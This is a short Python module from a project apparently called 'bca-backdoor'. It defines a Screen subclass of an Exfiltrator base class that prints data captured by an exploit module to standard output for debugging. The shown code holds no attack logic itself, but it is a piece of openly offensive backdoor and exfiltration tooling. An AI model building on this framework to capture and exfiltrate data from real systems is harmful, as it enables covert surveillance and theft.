#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = "EONRaider @ keybase.io/eonraider"

from src.modules.exfiltration.base import Exfiltrator, Exploit


class Screen(Exfiltrator):
    def __init__(self, *,
                 module: Exploit,
                 tag: str = None):
        super().__init__(module, tag)

    def update(self) -> None:
        """Display captured data at STDOUT for debugging purposes."""
        print(self.report)
